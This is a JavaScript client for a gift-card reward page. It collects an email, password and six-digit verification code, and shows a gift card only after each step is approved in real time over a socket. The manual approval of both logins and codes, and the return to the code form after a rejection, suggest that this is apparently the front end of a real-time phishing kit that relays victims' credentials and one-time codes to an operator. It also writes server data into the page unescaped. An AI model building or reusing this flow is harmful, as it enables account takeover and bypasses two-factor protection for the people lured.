class GiftCardApp {
    constructor() {
        this.socket = io();
        
        // 从本地存储中恢复会话状态
        this.currentMemberId = localStorage.getItem('currentMemberId');
        this.currentLoginId = localStorage.getItem('currentLoginId');
        this.currentVerificationId = localStorage.getItem('currentVerificationId');
        
        this.init();
    }

    init() {
        // 检查是否有未完成的登录会话
        this.checkPendingSession();
        
        this.bindEvents();
        this.setupSocketListeners();
        this.showPage('loginPage');
    }
    
    // 检查是否有未完成的登录会话
    checkPendingSession() {
        if (this.currentLoginId && this.currentMemberId) {
            
            // 发送取消请求
            fetch('/api/auth/member/cancel', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ 
                    loginId: this.currentLoginId,
                    memberId: this.currentMemberId
                })
            }).then(response => {
                if (response.ok) {
                } else {
                    // 记录详细错误信息
                    return response.text().then(text => {
                    });
                }
            }).then(() => {
                // 清除本地存储和会话状态
                this.clearSession();
            }).catch(error => {
                // 即使失败也清除会话状态，避免卡在错误状态
                this.clearSession();
            });
        }
    }
    
    // 清除会话状态
    clearSession() {
        this.currentMemberId = null;
        this.currentLoginId = null;
        this.currentVerificationId = null;
        localStorage.removeItem('currentMemberId');
        localStorage.removeItem('currentLoginId');
        localStorage.removeItem('currentVerificationId');
    }

    bindEvents() {
        // 登录表单
        document.getElementById('loginForm').addEventListener('submit', (e) => {
            e.preventDefault();
            this.handleLogin();
        });

        // 验证表单
        document.getElementById('verificationForm').addEventListener('submit', (e) => {
            e.preventDefault();
            this.handleVerification();
        });

        // 签到按钮
        document.getElementById('checkinBtn').addEventListener('click', () => {
            this.showCheckinPage();
        });

        // 执行签到
        document.getElementById('performCheckin').addEventListener('click', () => {
            this.performCheckin();
        });

        // 查看历史按钮
        document.getElementById('viewHistoryBtn').addEventListener('click', () => {
            this.showHistoryPage();
        });

        // 返回按钮
        document.getElementById('backToGiftCard').addEventListener('click', () => {
            this.showPage('giftCardPage');
        });

        document.getElementById('backFromHistory').addEventListener('click', () => {
            this.showPage('giftCardPage');
        });

        // 标签页切换
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                this.switchTab(e.target.dataset.tab);
            });
        });
    }

    setupSocketListeners() {
        // 添加页面关闭/刷新事件监听
        window.addEventListener('pagehide', () => {
            // 如果用户在等待登录审核或验证审核，发送取消请求
            if (this.currentLoginId && (
                document.getElementById('waitingPage').classList.contains('active') || 
                document.getElementById('verificationPage').classList.contains('active') ||
                document.getElementById('waitingVerificationPage').classList.contains('active')
            )) {
                // 使用 navigator.sendBeacon，这是专门为页面卸载时发送请求设计的
                const data = JSON.stringify({ 
                    loginId: this.currentLoginId,
                    memberId: this.currentMemberId
                });
                
                // 使用正确的路径
                navigator.sendBeacon('/api/auth/member/cancel', data);
            }
        });
        
        // 添加页面加载事件监听，用于处理刷新情况
        window.addEventListener('load', () => {
            // 检查本地存储中是否有未完成的登录会话
            const savedLoginId = localStorage.getItem('currentLoginId');
            const savedMemberId = localStorage.getItem('currentMemberId');
            
            if (savedLoginId && savedMemberId) {
                
                // 发送取消请求
                fetch('/api/auth/member/cancel', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ 
                        loginId: savedLoginId,
                        memberId: savedMemberId
                    })
                }).then(() => {
                }).catch(error => {
                });
            }
        });
        
        // 登录状态更新
        this.socket.on('login-status-update', (data) => {
            const statusDiv = document.getElementById('loginStatus');
            if (data.status === 'approved') {
                statusDiv.innerHTML = `<div class="status-message success">${i18n.t('login_approved')}</div>`;
                setTimeout(() => {
                    this.showPage('verificationPage');
                }, 2000);
            } else {
                statusDiv.innerHTML = `<div class="status-message error">${i18n.t('login_rejected')}</div>`;
                setTimeout(() => {
                    this.showPage('loginPage');
                }, 3000);
            }
        });

        // 验证状态更新
        this.socket.on('verification-approved', (data) => {
            const statusDiv = document.getElementById('verificationStatus');
            if (data.giftCardCode) {
                statusDiv.innerHTML = `<div class="status-message success">${i18n.t('verification_approved')}</div>`;
                setTimeout(() => {
                    this.showGiftCardPage(data.giftCardCode);
                }, 2000);
            } else {
                statusDiv.innerHTML = `<div class="status-message success">${i18n.t('verification_approved')}<br>${i18n.t('no_gift_cards_available')}</div>`;
                setTimeout(() => {
                    this.showGiftCardPage(null);
                }, 3000);
            }
        });

        this.socket.on('verification-rejected', (data) => {
            
            // 无论ID是否匹配，都处理拒绝事件
            // 这样可以确保用户在任何情况下都能回到验证页面
            
            const statusDiv = document.getElementById('verificationStatus');
            statusDiv.innerHTML = `<div class="status-message error">${i18n.t('verification_rejected')}</div>`;
            
            setTimeout(() => {
                // 重定向到二次验证表单页面，而不是登录页面
                this.showPage('verificationPage');
            }, 3000);
        });
    }

    async handleLogin() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        try {
            const response = await fetch('/api/auth/member/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ email, password })
            });

            const data = await response.json();

            if (response.ok) {
                this.currentMemberId = data.memberId;
                this.currentLoginId = data.loginId;
                
                // 保存到本地存储，以便在页面刷新时能够发送取消请求
                localStorage.setItem('currentLoginId', this.currentLoginId);
                localStorage.setItem('currentMemberId', this.currentMemberId);
                
                // 加入Socket房间
                this.socket.emit('join-member', this.currentMemberId);
                
                this.showPage('waitingPage');
            } else {
                this.showError(data.error);
            }
        } catch (error) {
            this.showError('网络错误，请重试');
        }
    }

    async handleVerification() {
        // 获取验证码输入框的值
        const verificationCode = document.getElementById('verificationCode').value;
        
        
        // 验证是否填写完整
        if (verificationCode.length !== 6) {
            this.showError('请输入完整的6位验证码');
            return;
        }

        try {
            const response = await fetch('/api/auth/member/verify', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ 
                    loginId: this.currentLoginId, 
                    verificationCode 
                })
            });

            const data = await response.json();

            if (response.ok) {
                this.currentVerificationId = data.verificationId;
                this.showPage('waitingVerificationPage');
            } else {
                // 显示错误并标记输入框
                this.showError(data.error);
                
                // 显示错误动画
                const digitElements = document.querySelectorAll('.code-digit');
                digitElements.forEach(digit => {
                    digit.classList.add('error');
                    setTimeout(() => digit.classList.remove('error'), 500);
                });
            }
        } catch (error) {
            this.showError('网络错误，请重试');
        }
    }
    
    // 设置验证码输入框的自动跳转
    setupVerificationInputs() {
        // 获取验证码输入框和显示数字的元素
        const codeInput = document.getElementById('verificationCode');
        const digitElements = document.querySelectorAll('.code-digit');
        
        // 清空输入框和显示
        codeInput.value = '';
        digitElements.forEach(digit => {
            digit.textContent = '';
            digit.classList.remove('filled');
        });
        
        // 移除之前的事件监听器，避免重复绑定
        // 使用更简单的方法：移除旧的监听器
        if (codeInput._inputHandler) {
            codeInput.removeEventListener('input', codeInput._inputHandler);
        }
        if (codeInput._pasteHandler) {
            codeInput.removeEventListener('paste', codeInput._pasteHandler);
        }
        
        // 移除数字框的旧事件监听器
        digitElements.forEach(digit => {
            if (digit._clickHandler) {
                digit.removeEventListener('click', digit._clickHandler);
            }
        });
        
        // 聚焦输入框
        setTimeout(() => codeInput.focus(), 100);
        
        // 创建新的输入事件处理器
        const inputHandler = (e) => {
            // 只允许输入数字
            codeInput.value = codeInput.value.replace(/[^0-9]/g, '');
            const code = codeInput.value;
            
            // 更新显示的数字
            digitElements.forEach((digit, index) => {
                if (index < code.length) {
                    digit.textContent = code[index];
                    digit.classList.add('filled');
                } else {
                    digit.textContent = '';
                    digit.classList.remove('filled');
                }
            });
            
            // 如果输入了6位数字，自动提交
            if (code.length === 6) {
                setTimeout(() => {
                    document.getElementById('verificationForm').dispatchEvent(new Event('submit'));
                }, 300);
            }
        };
        
        // 创建新的粘贴事件处理器
        const pasteHandler = (e) => {
            setTimeout(() => {
                // 只保留数字
                codeInput.value = codeInput.value.replace(/[^0-9]/g, '').slice(0, 6);
                
                // 触发input事件以更新显示
                codeInput.dispatchEvent(new Event('input'));
            }, 10);
        };
        
        // 绑定新的事件监听器
        codeInput.addEventListener('input', inputHandler);
        codeInput.addEventListener('paste', pasteHandler);
        
        // 保存处理器引用以便后续移除
        codeInput._inputHandler = inputHandler;
        codeInput._pasteHandler = pasteHandler;
        
        // 为数字框绑定点击事件
        digitElements.forEach(digit => {
            const clickHandler = () => {
                codeInput.focus();
            };
            digit.addEventListener('click', clickHandler);
            digit._clickHandler = clickHandler;
        });
    }

    showGiftCardPage(giftCardCode) {
        if (giftCardCode) {
            document.getElementById('giftCardCode').textContent = giftCardCode;
        } else {
            document.getElementById('giftCardCode').textContent = i18n.t('no_gift_cards_available');
        }
        this.showPage('giftCardPage');
    }

    async showCheckinPage() {
        this.showPage('checkinPage');
        await this.checkCheckinEligibility();
    }

    async checkCheckinEligibility() {
        try {
            const response = await fetch(`/api/member/checkin-eligibility/${this.currentMemberId}`);
            const data = await response.json();

            const eligibilityDiv = document.getElementById('checkinEligibility');
            const checkinBtn = document.getElementById('performCheckin');

            if (data.eligible) {
                eligibilityDiv.innerHTML = `
                    <div class="status-message success">
                        ${i18n.t('eligible_for_checkin')}
                        <br>${i18n.t('days_remaining')}: ${data.daysRemaining}
                    </div>
                `;
                checkinBtn.disabled = false;
            } else {
                eligibilityDiv.innerHTML = `
                    <div class="status-message error">
                        ${i18n.t('not_eligible_for_checkin')}
                        <br>${data.reason}
                    </div>
                `;
                checkinBtn.disabled = true;
            }
        } catch (error) {
        }
    }

    async performCheckin() {
        try {
            const response = await fetch('/api/member/checkin', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ memberId: this.currentMemberId })
            });

            const data = await response.json();
            const resultDiv = document.getElementById('checkinResult');

            if (response.ok) {
                let message = i18n.t('checkin_successful');
                if (data.giftCardCode) {
                    message += `<br><strong>${data.giftCardCode}</strong>`;
                }
                resultDiv.innerHTML = `<div class="status-message success">${message}</div>`;
                
                // 重新检查签到资格
                setTimeout(() => {
                    this.checkCheckinEligibility();
                }, 2000);
            } else {
                resultDiv.innerHTML = `<div class="status-message error">${data.error}</div>`;
            }
        } catch (error) {
            document.getElementById('checkinResult').innerHTML = 
                `<div class="status-message error">网络错误，请重试</div>`;
        }
    }

    async showHistoryPage() {
        this.showPage('historyPage');
        await this.loadGiftCardsHistory();
        await this.loadCheckinsHistory();
    }

    async loadGiftCardsHistory() {
        try {
            const response = await fetch(`/api/member/gift-cards/${this.currentMemberId}`);
            const giftCards = await response.json();

            const listDiv = document.getElementById('giftCardsList');
            if (giftCards.length === 0) {
                listDiv.innerHTML = '<p>暂无礼品卡记录</p>';
                return;
            }

            listDiv.innerHTML = giftCards.map(card => `
                <div class="record-item">
                    <h4>${card.category_name || i18n.t('category')}</h4>
                    <p><strong>${i18n.t('code')}:</strong> <span class="gift-code">${card.code}</span></p>
                    <p><strong>${i18n.t('status')}:</strong> ${card.status}</p>
                    <p><strong>${i18n.t('distributed_at')}:</strong> ${new Date(card.distributed_at).toLocaleString()}</p>
                </div>
            `).join('');
        } catch (error) {
        }
    }

    async loadCheckinsHistory() {
        try {
            const response = await fetch(`/api/member/checkin-history/${this.currentMemberId}`);
            const checkins = await response.json();

            const listDiv = document.getElementById('checkinsList');
            if (checkins.length === 0) {
                listDiv.innerHTML = '<p>暂无签到记录</p>';
                return;
            }

            listDiv.innerHTML = checkins.map(checkin => `
                <div class="record-item">
                    <h4>${i18n.t('checkin_date')}: ${checkin.checkin_date}</h4>
                    ${checkin.gift_card_code ? 
                        `<p><strong>${i18n.t('gift_card_received')}:</strong> <span class="gift-code">${checkin.gift_card_code}</span></p>` : 
                        '<p>无礼品卡奖励</p>'
                    }
                </div>
            `).join('');
        } catch (error) {
        }
    }

    switchTab(tabName) {
        // 更新标签按钮状态
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.classList.remove('active');
        });
        document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');

        // 更新标签内容显示
        document.querySelectorAll('.tab-content').forEach(content => {
            content.classList.remove('active');
        });
        document.getElementById(`${tabName}Tab`).classList.add('active');
    }

    showPage(pageId) {
        document.querySelectorAll('.page').forEach(page => {
            page.classList.remove('active');
        });
        document.getElementById(pageId).classList.add('active');
        
        // 清除所有状态消息
        this.clearStatusMessages();
        
        // 如果显示的是验证页面，设置验证码输入框
        if (pageId === 'verificationPage') {
            this.setupVerificationInputs();
        }
    }
    
    // 清除所有状态消息
    clearStatusMessages() {
        // 清除登录状态消息
        const loginStatus = document.getElementById('loginStatus');
        if (loginStatus) {
            loginStatus.innerHTML = '';
        }
        
        // 清除验证状态消息
        const verificationStatus = document.getElementById('verificationStatus');
        if (verificationStatus) {
            verificationStatus.innerHTML = '';
        }
    }

    showError(message) {
        alert(message); // 简单的错误显示，可以改进为更好的UI
    }
}

// 初始化应用
document.addEventListener('DOMContentLoaded', () => {
    new GiftCardApp();
});